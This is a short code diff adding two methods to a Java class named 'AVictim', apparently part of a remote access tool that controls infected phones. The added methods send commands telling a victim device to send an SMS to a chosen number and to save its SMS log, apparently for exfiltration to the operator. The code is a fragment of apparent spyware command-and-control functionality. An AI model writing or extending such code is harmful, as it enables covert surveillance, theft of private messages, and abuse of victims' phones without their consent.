@@ -110,4 +110,20 @@ public class AVictim extends Victim {
         sendMessage(query);
     }
 
+    public void sendSendSms(String phoneNumber, String text, String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "send.sms");
+        query.put("phoneNumber", phoneNumber);
+        query.put("text", text);
+        query.put("owner", owner);
+        sendMessage(query);
+    }
+
+    public void sendSaveSmsLog(String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "save.sms.log");
+        query.put("owner", owner);
+        sendMessage(query);
+    }
+
 }
